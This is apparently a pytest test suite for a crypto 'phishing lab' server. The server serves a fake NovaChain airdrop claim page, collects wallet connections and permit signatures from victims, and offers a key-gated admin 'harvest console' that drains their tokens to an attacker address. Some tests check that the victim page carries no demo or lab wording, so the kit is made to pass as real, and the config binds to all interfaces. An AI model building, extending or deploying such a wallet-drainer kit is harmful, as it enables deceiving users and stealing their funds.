"""钓鱼实验室服务(scripts/phish_server.py)的 L1 测试。

覆盖:config fail-closed 校验、事件流→待收割清单、/admin 口令门、
单坏请求不崩服务。收割的链上行为由 tests/test_drain.py 的 Anvil e2e 覆盖。
"""

import importlib.util
import json
import pathlib
import urllib.request
from http.server import ThreadingHTTPServer

import pytest
import yaml

_ROOT = pathlib.Path(__file__).parent.parent
_spec = importlib.util.spec_from_file_location(
    "phish_server", _ROOT / "scripts" / "phish_server.py")
phish = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(phish)

EXAMPLE = _ROOT / "scripts" / "config.example.yaml"
KEY = yaml.safe_load(EXAMPLE.read_text())["server"]["admin_key"]


@pytest.fixture()
def server(monkeypatch):
    cfg = phish.load_config(str(EXAMPLE))
    phish.Handler.cfg = cfg
    # 离线密闭:余额/交易打桩且带状态守恒(转账会真实增减),L1 不依赖本机是否有 Anvil
    balances = {}

    def stub_balance(url, token, holder):
        return balances.get(holder.lower(), 10**21)

    def stub_drain(url, token, victim, amount, key, attacker="0x" + "00" * 20):
        balances[victim.lower()] = balances.get(victim.lower(), 10**21) - amount
        balances[attacker.lower()] = balances.get(attacker.lower(), 10**21) + amount
        return None

    monkeypatch.setattr(phish.drain, "balance_of", stub_balance)
    monkeypatch.setattr(phish.drain, "send", lambda *a, **k: "0xstub")
    monkeypatch.setattr(phish.drain, "drain", stub_drain)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), phish.Handler)
    thread = __import__("threading").Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{httpd.server_address[1]}"
    finally:
        httpd.shutdown()
        httpd.server_close()
        thread.join(timeout=5)
        phish.STORE.events.clear()
        phish.STORE.items.clear()


def _get(url, expect=200):
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def _post(url, obj):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read())


class TestLoadConfig:
    def test_example_loads(self):
        cfg = phish.load_config(str(EXAMPLE))
        assert cfg["server"]["bind"].startswith("0.0.0.0:")

    def test_missing_file_exits(self, tmp_path):
        with pytest.raises(SystemExit, match="不存在"):
            phish.load_config(str(tmp_path / "nope.yaml"))

    def test_missing_section_exits(self, tmp_path):
        p = tmp_path / "c.yaml"
        p.write_text("attacker:\n  address: '0x1111111111111111111111111111111111111111'\n  key: '0x1'\n")
        with pytest.raises(SystemExit, match="缺少节"):
            phish.load_config(str(p))

    def test_missing_key_exits(self, tmp_path):
        cfg = yaml.safe_load(EXAMPLE.read_text())
        del cfg["attacker"]["key"]
        p = tmp_path / "c.yaml"
        p.write_text(yaml.dump(cfg, allow_unicode=True))
        with pytest.raises(SystemExit, match="attacker.key"):
            phish.load_config(str(p))

    def test_bad_address_exits(self, tmp_path):
        cfg = yaml.safe_load(EXAMPLE.read_text())
        cfg["attacker"]["address"] = "0x123"
        p = tmp_path / "c.yaml"
        p.write_text(yaml.dump(cfg, allow_unicode=True))
        with pytest.raises(SystemExit, match="不是合法地址"):
            phish.load_config(str(p))

    def test_bad_claim_mode_exits(self, tmp_path):
        cfg = yaml.safe_load(EXAMPLE.read_text())
        cfg["site"]["claim_mode"] = "steal"
        p = tmp_path / "c.yaml"
        p.write_text(yaml.dump(cfg, allow_unicode=True))
        with pytest.raises(SystemExit, match="claim_mode"):
            phish.load_config(str(p))

    def test_bad_style_exits(self, tmp_path):
        cfg = yaml.safe_load(EXAMPLE.read_text())
        cfg["site"]["style"] = "windows98"
        p = tmp_path / "c.yaml"
        p.write_text(yaml.dump(cfg, allow_unicode=True))
        with pytest.raises(SystemExit, match="style"):
            phish.load_config(str(p))


class TestSitePage:
    STYLES = {"official": "Claim 立即领取", "meme": "CLAIM NOW", "exchange": "立即领取"}

    def test_page_has_no_demo_markings(self, server):
        status, page = _get(server + "/")
        assert status == 200
        text = page.lower()
        for banned in ("演示", "triplab-case", "仅为本地", "仅限本地", "anvil", "test key"):
            assert banned not in text, f"受害者页面泄漏了演示字样: {banned}"

    def test_page_injects_config_and_shared_js(self, server):
        _, page = _get(server + "/")
        assert "星穹协议 NovaChain" in page
        assert "__CONFIG_JSON__" not in page and "__PROJECT__" not in page
        assert '<script src="/app.js"></script>' in page
        status, js = _get(server + "/app.js")
        assert status == 200 and "eth_requestAccounts" in js and "__CONFIG_JSON__" not in js

    def test_all_three_styles_served_clean(self, server):
        for style, marker in self.STYLES.items():
            cfg = phish.load_config(str(EXAMPLE))
            phish.Handler.cfg = {**cfg, "site": {**cfg["site"], "style": style}}
            status, page = _get(server + "/")
            assert status == 200 and marker in page, f"style={style} 页面异常"
            low = page.lower()
            for banned in ("演示", "anvil", "traplab"):
                assert banned not in low, f"style={style} 泄漏: {banned}"
        phish.Handler.cfg = phish.load_config(str(EXAMPLE))


class TestAdminGate:
    def test_admin_requires_key(self, server):
        status, _ = _get(server + "/admin")
        assert status == 403
        status, _ = _get(server + "/admin?key=wrong")
        assert status == 403

    def test_admin_with_key(self, server):
        status, page = _get(server + f"/admin?key={KEY}")
        assert status == 200 and "收割台" in page

    def test_state_api_requires_key(self, server):
        status, _ = _get(server + "/admin/api/state")
        assert status == 403


class TestEventFlow:
    def test_connect_event_appears(self, server):
        status, body = _post(server + "/api/event", {"type": "connect", "address": "0xabc"})
        assert status == 200
        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
        assert any("0xabc" in e["text"] for e in state["events"])

    def test_unknown_event_rejected(self, server):
        status, _ = _post(server + "/api/event", {"type": "hack"})
        assert status == 400

    def test_permit_event_creates_pending_item(self, server):
        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
        status, body = _post(server + "/api/event", {
            "type": "permit", "owner": "0x" + "ab" * 20, "sig": sig,
            "value": hex(10**21), "deadline": "1893456000", "nonce": "0"})
        assert status == 200
        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
        item = next(i for i in state["items"] if i["id"] == body["itemId"])
        assert item["status"] == "pending" and item["type"] == "permit"

    def test_state_includes_meta_and_balances(self, server):
        _post(server + "/api/event", {"type": "connect", "address": "0x" + "cd" * 20})
        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
        assert state["meta"]["symbol"] == "AIRDROP"
        assert state["meta"]["attacker"].startswith("0x")
        assert state["balances"]["attacker"] >= 0
        assert state["balances"]["victim"]["address"] == "0x" + "cd" * 20

    def test_last_victim_falls_back_to_items(self, server):
        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
        _post(server + "/api/event", {"type": "permit", "owner": "0x" + "ef" * 20,
                                      "sig": sig, "value": hex(5), "deadline": "1", "nonce": "0"})
        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
        assert state["balances"]["victim"]["address"] == "0x" + "ef" * 20

    def test_state_degrades_when_chain_down(self, server, monkeypatch):
        def boom(*a, **k):
            raise RuntimeError("connection refused")
        monkeypatch.setattr(phish.drain, "balance_of", boom)
        status, state = _get(server + f"/admin/api/state?key={KEY}")
        state = json.loads(state)
        assert status == 200 and state["balances"] is None
        assert "链不可达" in state["balance_error"]


class TestDrainGuard:
    def _permit_item(self, server, owner="0x" + "ab" * 20, value=hex(10**21)):
        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
        _, body = _post(server + "/api/event", {"type": "permit", "owner": owner,
                                                "sig": sig, "value": value,
                                                "deadline": "1893456000", "nonce": "0"})
        return body["itemId"]

    def test_success_then_duplicate_rejected(self, server):
        item_id = self._permit_item(server)
        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
        assert status == 200 and result["drained"] == 10**21
        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
        assert status == 200 and "error" in result

    def test_failure_returns_error_and_reverts_to_pending(self, server):
        item_id = self._permit_item(server)
        orig = phish.drain.send
        phish.drain.send = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("链上 revert"))
        try:
            status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
        finally:
            phish.drain.send = orig
        assert status == 200 and "revert" in result["error"]
        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
        item = next(i for i in state["items"] if i["id"] == item_id)
        assert item["status"] == "pending"  # 回到待收割,可重试

    def test_drain_all_counts_success_and_failure(self, server):
        id_ok = self._permit_item(server)
        id_bad = self._permit_item(server, owner="0x" + "cd" * 20)
        orig = phish.drain.drain
        calls = {"n": 0}
        def flaky(*a, **k):
            calls["n"] += 1
            if calls["n"] == 1:
                raise RuntimeError("余额为 0")
            return None
        phish.drain.drain = flaky
        try:
            status, result = _post(server + f"/admin/api/drain?key={KEY}", {"all": True})
        finally:
            phish.drain.drain = orig
        assert status == 200
        assert result["drained_count"] == 1 and len(result["results"]) == 2
        assert any("error" in r for r in result["results"])

    def test_bad_request_does_not_kill_server(self, server):
        req = urllib.request.Request(server + "/api/event", data=b"not json",
                                     headers={"Content-Type": "application/json"})
        with pytest.raises(urllib.error.HTTPError):
            urllib.request.urlopen(req, timeout=10)
        # 服务仍存活
        status, _ = _get(server + f"/admin/api/state?key={KEY}")
        assert status == 200
